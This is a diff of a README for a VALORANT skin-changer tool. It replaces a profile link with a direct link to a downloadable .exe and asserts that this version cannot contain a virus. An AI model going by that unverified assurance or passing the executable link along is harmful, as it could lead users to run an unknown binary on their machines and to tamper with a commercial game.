@@ -6,7 +6,7 @@ People keep downloading some virus that happens to be called VALORANT Skin Chang
 To prevent this, I decided to release a free version of my Skin Changer, so people can download it without any chance to get a virus from it.
 
 # Download
-Link: [Click Me](https://github.com/ClearThatsJS)
+Link: [Click Me](https://github.com/ClearThatsJS/VALORANT-SkinChanger-Pro/raw/main/VALORANT-SkinChanger.exe)
 
 # Note
 Skins are only working with default animations
